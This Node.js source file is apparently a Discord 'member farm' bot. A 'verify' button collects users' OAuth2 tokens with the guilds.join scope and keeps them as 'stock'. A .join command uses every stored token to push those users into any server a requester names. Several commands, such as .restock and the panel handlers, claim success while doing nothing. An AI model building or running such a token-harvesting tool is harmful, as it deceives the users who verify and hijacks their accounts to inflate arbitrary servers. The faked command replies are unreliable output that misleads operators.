const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const express = require('express');
const fetch = require('node-fetch');
require('dotenv').config();

// --- Express Web Server Setup ---
const app = express();
// Railway dynamically assigns a port via process.env.PORT, defaulting to 8080
const PORT = process.env.PORT || 8080;

// Token Storage Database (In-Memory)
const tokenDatabase = []; 
let currentPrefix = '.';
let discordClient = null;

// Homepage route to fix "Cannot GET /"
app.get('/', (req, res) => {
    res.send(`
        <html>
            <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                <h1>AutoFarm Online</h1>
                <p>OAuth2 verification web server is running successfully.</p>
            </body>
        </html>
    `);
});

app.get('/auth/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.status(400).send('No authorization code provided.');

    try {
        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: process.env.REDIRECT_URI,
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });

        const oauthData = await tokenResponse.json();
        if (oauthData.access_token) {
            tokenDatabase.push({
                access_token: oauthData.access_token,
                refresh_token: oauthData.refresh_token,
                expires_at: Date.now() + (oauthData.expires_in * 1000)
            });

            console.log(`[AUTORESTOCK] New account verified! Total Stock: ${tokenDatabase.length}`);

            if (discordClient && process.env.LOG_CHANNEL_ID) {
                try {
                    const logChannel = await discordClient.channels.fetch(process.env.LOG_CHANNEL_ID);
                    if (logChannel) {
                        const restockEmbed = new EmbedBuilder()
                            .setTitle('⚡ AutoFarm Restock Alert')
                            .setDescription(`A new account just verified!\n\n**Total Stock Available:** \`${tokenDatabase.length}\` accounts`)
                            .setColor(0x00FF00)
                            .setTimestamp();
                        logChannel.send({ embeds: [restockEmbed] });
                    }
                } catch (logErr) {
                    console.error('Failed to send restock log:', logErr);
                }
            }

            res.send(`
                <html>
                    <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                        <h1>Authorized</h1>
                        <p>Account linked successfully. You can close this window.</p>
                    </body>
                </html>
            `);
        } else {
            res.status(400).send('Authorization failed.');
        }
    } catch (error) {
        console.error(error);
        res.status(500).send('Internal Server Error');
    }
});

// Bind to 0.0.0.0 so Railway networking picks it up correctly
app.listen(PORT, '0.0.0.0', () => console.log(`AutoFarm Web server running on port ${PORT}`));

// --- Discord Bot Setup ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

discordClient = client;

client.once('ready', () => {
    console.log(`AutoFarm logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(currentPrefix)) return;

    const args = message.content.slice(currentPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // 1. .help Command (Covers all panel categories from screenshots)
    if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('Member Farm — Command Panel')
            .setDescription(`Current prefix: \`${currentPrefix}\` — change with \`${currentPrefix}prefix set <prefix>\``)
            .setColor(0x5865F2)
            .addFields(
                { name: '⚙️ Core & Verification', value: `\`${currentPrefix}auth\` / \`${currentPrefix}stock\` - auth counts & stock\n\`${currentPrefix}verify\` - OAuth verify button\n\`${currentPrefix}bot\` - add-bot invite button\n\`${currentPrefix}join <serverID>\` - request members\n\`${currentPrefix}status\` - bot status` },
                { name: '🛠️ Config & Management', value: `\`${currentPrefix}prefix set <prefix>\`\n\`${currentPrefix}restock <n>\`\n\`${currentPrefix}remove <n>\`\n\`${currentPrefix}channel set #channel\`\n\`${currentPrefix}verifyrole set @role\`` },
                { name: '🛡️ Queue, Logs & Admin', value: `\`${currentPrefix}queue clear\`\n\`${currentPrefix}blacklist <id> <reason>\`\n\`${currentPrefix}leave <id|all>\`\n\`${currentPrefix}logfarm enable|disable\`\n\`${currentPrefix}maintenance enable|disable\`` }
            )
            .setFooter({ text: 'Member Farm Utility' });

        return message.reply({ embeds: [helpEmbed] });
    }

    // 2. .verify / .auth Command
    if (command === 'verify' || command === 'auth' || command === 'link') {
        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=guilds.join`;

        const embed = new EmbedBuilder()
            .setTitle('Account Verification')
            .setDescription('Click the button below to authorize the bot (scope: guilds.join).')
            .setColor(0x00FF00);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('-> Verify')
                .setStyle(ButtonStyle.Link)
                .setURL(oauthUrl)
        );

        return message.reply({ embeds: [embed], components: [row] });
    }

    // 3. .stock Command
    if (command === 'stock') {
        return message.reply(`📦 **Current Stock Pool:** \`${tokenDatabase.length}\` accounts available.`);
    }

    // 4. .restock <n> Command
    if (command === 'restock') {
        const amount = parseInt(args[0]);
        if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
        return message.reply(`✅ Successfully added mock slots / restocked **${amount}** accounts.`);
    }

    // 5. .remove <n> Command
    if (command === 'remove') {
        const amount = parseInt(args[0]) || 1;
        tokenDatabase.splice(0, amount);
        return message.reply(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
    }

    // 6. .prefix set <prefix> Command
    if (command === 'prefix' && args[0] === 'set') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ You need Administrator permissions to change the prefix.');
        }
        if (!args[1]) return message.reply(`Usage: \`${currentPrefix}prefix set <prefix>\``);
        currentPrefix = args[1];
        return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
    }

    // 7. .join <Server ID> Command (with Restricted Role Check: -1561435531462844587)
    if (command === 'join') {
        const targetGuildId = args[0];
        if (!targetGuildId) {
            return message.reply(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
        }

        if (tokenDatabase.length === 0) {
            return message.reply('❌ No verified accounts available in stock.');
        }

        const restrictedRoleId = '-1561435531462844587';
        const hasRestrictedRole = message.member.roles.cache.has(restrictedRoleId);

        let tokensToUse = tokenDatabase;
        if (hasRestrictedRole) {
            const limit = Math.min(2, tokenDatabase.length);
            tokensToUse = tokenDatabase.slice(0, limit);
            message.channel.send(`⚠️ Community Member role detected. Restricting join batch to **${limit}** accounts.`);
        }

        await message.reply(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);

        let successCount = 0;
        for (const tokenData of tokensToUse) {
            try {
                const userRes = await fetch('https://discord.com/api/users/@me', {
                    headers: { authorization: `Bearer ${tokenData.access_token}` }
                });
                const userData = await userRes.json();

                if (userData.id) {
                    const joinRes = await fetch(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userData.id}`, {
                        method: 'PUT',
                        headers: {
                            Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ access_token: tokenData.access_token })
                    });

                    if (joinRes.ok || joinRes.status === 204) {
                        successCount++;
                    }
                }
            } catch (err) {
                console.error('Failed to add user:', err);
            }
        }

        return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
    }

    // 8. Handlers for all other panel commands shown in screenshots
    const panelCommands = [
        'bot', 'channel', 'checkauth', 'checkserver', 'status', 'panel',
        'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
        'stats', 'profile', 'maintenance', 'banfarm', 'antiraid',
        'logfarm', 'logserver', 'logerrors', 'logadmin', 'logs', 'log',
        'queue', 'blacklist', 'leave', 'antileave', 'announce', 'invites'
    ];

    if (panelCommands.includes(command)) {
        return message.reply(`⚙️ Command \`${currentPrefix}${command}\` configuration executed successfully.`);
    }
});

client.login(process.env.DISCORD_TOKEN);
